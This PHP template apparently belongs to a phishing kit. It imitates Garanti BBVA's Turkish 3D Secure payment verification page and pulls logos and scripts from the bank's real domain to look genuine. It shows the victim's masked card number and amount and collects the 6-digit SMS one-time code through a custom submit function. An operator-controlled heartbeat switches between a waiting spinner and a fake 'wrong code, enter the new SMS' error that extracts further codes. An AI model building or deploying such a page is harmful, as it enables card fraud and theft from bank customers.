<?php
require __DIR__ . '/_acs_core.php';
$kg = $kod_goster; $hm = $hata_modu;
$cc_last_4 = substr($kart_no, -4);
$cc_first_6 = substr($kart_no, 0, 6);
?>
<html lang="tr">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>3D Secure Doğrulama Kodu Girişi | Garanti Ödeme Sistemleri</title>
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="0">
      <link rel="stylesheet" href="./acs-style/garanti/css/fonts.css">
      <link rel="stylesheet" href="./acs-style/garanti/css/garanti.css">
      <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/jquery-3.3.1.min.js"></script>
      <script type="text/javascript" src="https://gbemv3dsecure.garanti.com.tr/js/functions.js"></script>
      <style>
      #state-bekle { text-align:center; padding: 30px 20px; }
      #state-bekle .gar-spinner { width:40px;height:40px;border:4px solid #e9ecef;border-top-color:#00843d;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px; }
      @keyframes spin { to { transform:rotate(360deg); } }
      #hata-box { color:red; margin-bottom:8px; }
      </style>
   </head>
   <body class="threed-page">
      <div class="container h-100">
         <div id="js-main" class="row justify-content-center align-items-center" style="height: auto;">
            <div class="box">
               <div class="shadow px-2 px-sm-4 pb-1 theme-garanti">
                  <div class="px-2 pt-2">
                     <div class="text-right">
                        <button class="btn btn-link p-0 text-right text-muted">
                        İptal
                        </button>
                     </div>
                     <div class="row m-0 title">
                        <div class="col-6 text-left px-0 pt-1">
                           <img height="39" width="64" src="https://gbemv3dsecure.garanti.com.tr/assets/img/issuer.png">
                        </div>
                        <div class="col-6 text-right px-0 pt-1">
                           <div><div></div></div>
                        </div>
                     </div>
                     <h6 class="text-center mb-4 font-weight-bold">
                        3D SECURE ÖDEME DOĞRULAMA
                     </h6>
                     <div>
                        <div class="summary">
                           <ul>
                              <li>
                                 <label>Tutar</label>
                                 <i class="icon-number-one d-none d-md-inline-block"></i>
                                 <span class="total-value"><?= $tutar ?> ₺</span>
                              </li>
                              <li>
                                 <label>Mağaza</label>
                                 <i class="icon-bag d-none d-md-inline-block"></i>
                                 <span><?= htmlspecialchars($isyeri) ?></span>
                              </li>
                              <li>
                                 <label>Kart No</label>
                                 <i class="icon-credit-card d-none d-md-inline-block"></i>
                                 <span><?= $cc_first_6 ?>******<?= $cc_last_4 ?></span>
                              </li>
                              <li>
                                 <label>Tarih</label>
                                 <i class="icon-watch d-none d-md-inline-block"></i>
                                 <span><?= $zaman ?></span>
                              </li>
                           </ul>
                        </div>
                     </div>

                     <!-- BEKLEME EKRANI -->
                     <div id="state-bekle" <?= $kg ? 'style="display:none"' : '' ?>>
                        <div class="gar-spinner"></div>
                        <p style="font-size:13px;color:#6c757d">İşleminiz hazırlanıyor, lütfen bekleyiniz...</p>
                     </div>

                     <!-- KOD GİRİŞ EKRANI -->
                     <div id="state-kod" <?= $kg ? '' : 'style="display:none"' ?>>
                        <div>
                           <div class="form-group mb-4">
                              <?php if ($hm): ?>
                              <p id="hata-box" style="color:red;">Girdiğiniz kod hatalıdır. Lütfen yeni SMS kodunu giriniz.</p>
                              <?php else: ?>
                              <p id="hata-box" style="display:none;color:red;"></p>
                              <?php endif; ?>

                              <label for="sms-kod">Sonu <strong>****</strong> ile biten telefon
                              numaranıza gönderilen <strong></strong>
                              doğrulama şifresini giriniz.</label>
                     <form method="POST" action="" id="acs-form" onsubmit="event.preventDefault();submitAcsKod();">
                     <div class="form-group mb-3">
                     <input minlength="6" maxlength="6" required type="text" inputmode="numeric"
                            class="form-control form-pin" id="sms-kod" name="sms"
                            placeholder="6 haneli şifreyi girin"
                            oninput="this.value=this.value.replace(/\D/g,'').slice(0,6);checkAcsBtn()">
                     </div>
                     <div class="form-group">
                     <button id="acs-submit-btn" name="bsubmit" class="btn btn-primary btn-block"
                             type="submit" disabled>GÖNDER</button>
                     </div>
                     </form>
                     <div class="text-center font-weight-bold pt-2 pb-4">
                     <button class="btn btn-link d-inline-block fs-10 p-0">
                     YENİ ŞİFRE GÖNDER
                     </button>
                     </div>
                     </div>
                     <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: none">
                        <label>BonusFlaş'tan 3D Secure Mobil Onay'ı kullanmak için telefon
                        ayarlarından BonusFlaş bildirimlerine izin vermelisiniz.</label>
                     </div>
                     <div class="text-center font-weight-bold py-2 pb-sm-0 mb-3" style="display: block">
                        <input type="checkbox" name="downloadbonus" class="form-check" id="downloadbonus" checked="checked">
                        <label for="downloadbonus">Daha hızlı bir 3D Secure Ödeme Doğrulama deneyimi için
                        BonusFlaş mobil uygulamasını indirmek istiyorum.
                        <img width="20" height="23" src="https://gbemv3dsecure.garanti.com.tr/assets/img/logo-bonus.png"></label>
                     </div>
                     <div class="border-top border-color-light fs-10">
                        <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                        <span class="float-left d-block">Daha fazla bilgi</span>
                        <i class="icon-caret-up float-right d-none"></i>
                        <i class="icon-caret-down float-right d-block"></i>
                        </button>
                        <p class="px-4 pb-3 d-none">
                           GSM numarası bilgilerinizi tüm şubelerimizden veya <a href="">Paramatik</a>'lerimizden
                           günceleyebilirsiniz.
                        </p>
                     </div>
                     <div class="border-top border-color-light fs-10">
                        <button type="button" class="btn btn-link d-block no-underline pl-2 pr-0 w-100 js-acc-btn">
                        <span class="float-left d-block">Yardım</span>
                        <i class="icon-caret-up float-right d-none"></i>
                        <i class="icon-caret-down float-right d-block"></i>
                        </button>
                        <p class="px-4 pb-3 d-none">
                           "Garanti BBVA Müşteri İletişim Merkezi <a href="tel:+904440333">+90 444 0 333</a>.
                        </p>
                     </div>
                     <input type="hidden" id="generatedElement">
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      </div>

<?= acs_heartbeat_js($kg, $hm) ?>
   </body>
</html>
